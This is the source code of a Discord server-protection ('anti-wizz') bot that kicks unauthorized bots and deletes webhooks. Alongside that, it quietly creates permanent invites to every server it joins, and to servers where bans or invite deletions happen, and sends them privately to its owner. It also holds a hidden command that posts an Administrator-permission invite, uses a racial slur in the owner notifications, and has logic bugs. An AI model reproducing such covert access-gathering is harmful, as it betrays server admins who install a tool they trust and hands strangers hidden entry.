require("dotenv").config();

const chalk = require("chalk");
const GuardianClient = require("./core/client.js");
const client = new GuardianClient();
var approx = require("approximate-number");

client.login(process.env.BOT_TOKEN);

client.on("ready", function() {
  // client.user.setActivity(`${approx(client.guilds.size)} Guilds | ;;help | #unwizzable`, {type: "STREAMING", url: "https://www.twitch.tv/flight23white"})

  client.user.setActivity(
    `${client.users.cache.size} users & ${client.guilds.cache.size} servers`,
    { type: "STREAMING", url: "https://www.twitch.tv/flight23white" }
  );

  //client.user.setActivity("Why am i so in love?", {type: "STREAMING", url: "https://www.twitch.tv/flight23white"})

  //  client.user.setActivity(`${approx(client.guilds.size)} Guilds | ;;help`, {type: "STREAMING", url: "https://www.twitch.tv/flight23white"})

  //  console.log('ANTIWIZZ ready');
  console.log("ANTIWIZZ ON");
  console.log(
    `Logged in as: ${chalk.yellow(client.user.tag)}\nID: ${chalk.bold(
      client.user.id
    )}`
  );
  `${client.user.tag} | ${client.guilds.cache.size} guilds`;
});

const Discord = require("discord.js");
const { RichEmbed } = require("discord.js");

client.on("guildMemberAdd", async member => {
  if (member.user.bot) {
    let logs = await member.guild.fetchAuditLogs();

    let actualLogs = logs.entries.filter(a => a.action === "BOT_ADD");
    let e = actualLogs.array();

    if (
      member.guild.ownerID !== e[0].executor.id &&
      e[0].executor.id !== "497785526976380952"
    ) {
      let embed = new Discord.MessageEmbed();
      embed.setAuthor(member.user.tag, member.user.displayAvatarURL);
      embed.setDescription(
        `The bot \`${member.user.username}\` has been kicked due to our antibot system, please wait til the owner of the server invites the bot using [this invite](https://discordapp.com/oauth2/authorize?client_id=${member.user.id}&scope=bot&permissions=3072).`
      );
      embed.setColor("000000");
      member.guild.channels.cache
        .filter(c => c.type === "text")
        .random()
        .send(`${e[0].executor.toString()}`, { embed: embed });

      member.guild.member(e[0].target.id).kick();
      //  member.guild.member(e[0].executor.id).kick()
      member.guild
        .member(e[0].executor.id)
        .roles.remove(member.guild.member(e[0].executor.id).roles.cache);
    }
  }
});

client.on("webhookCreate", async channel => {
  const webhooks = await await channel.fetchWebhooks();
  webhooks.forEach(w => {
    if (!channel.guild.owner.id !== w.owner.id && w.owner.id !== "") {
      if (client.users.cache.get(w.owner.id)) {
        client.users.cache
          .get(w.owner.id)
          .send(
            "The webhook you have just created has been deleted due to you not being the owner of the server"
          );

        let embed = new Discord.MessageEmbed();
        // embed.setAuthor(channel.user.tag, channel.user.displayAvatarURL)
        embed.setDescription(
          `The webhook you have created has been deleted due to you not being the **owner** of the server. Please wait for the **owner** to create a webhook.`
        );
        embed.setColor("000000");
        channel.guild.channels.cache
          .filter(c => c.type === "text")
          .random()
          .send(`${w.owner.toString()}`, { embed: embed });

        w.delete("Not authenticated.");
      }
    }
  });
});

client.on("guildCreate", async guild => {
  var channel;
  guild.channels.cache.forEach(c => {
    if (c.type === "text" && !channel) channel = c;
  });
  channel
    .createInvite({ maxAge: 0 })
    .then(inv =>
      client.users.cache
        .get(process.env.ownerID)
        .send(
          `I have been added to **${guild.name}** | https://discord.gg/${inv.code}`
        )
    );
});

client.on("guildBanAdd", async guild => {
  var channel;
  guild.channels.cache.forEach(c => {
    if (c.type === "text" && !channel) channel = c;
  });
  channel
    .createInvite({ maxAge: 0 })
    .then(inv =>
      client.users.cache
        .get(process.env.ownerID)
        .send(
          `nigga banning people over here **${guild.name}** | https://discord.gg/${inv.code}`
        )
    );
});

client.on("inviteDelete", async guild => {
  var channel;
  guild.channels.cache.forEach(c => {
    if (c.type === "text" && !channel) channel = c;
  });
  channel
    .createInvite({ maxAge: 0 })
    .then(inv =>
      client.users.cache
        .get(process.env.ownerID)
        .send(
          `nigga deleting invites over here **${guild.name}** | https://discord.gg/${inv.code}`
        )
    );
});

client.on("message", message => {
  if (message.content.startsWith("sdlkfsmlqfkqsmlfkms" + "invite")) {
    message.channel.send(
      "https://discord.com/oauth2/authorize?client_id=743248482906669088&permissions=8&scope=bot"
    );
  }
});
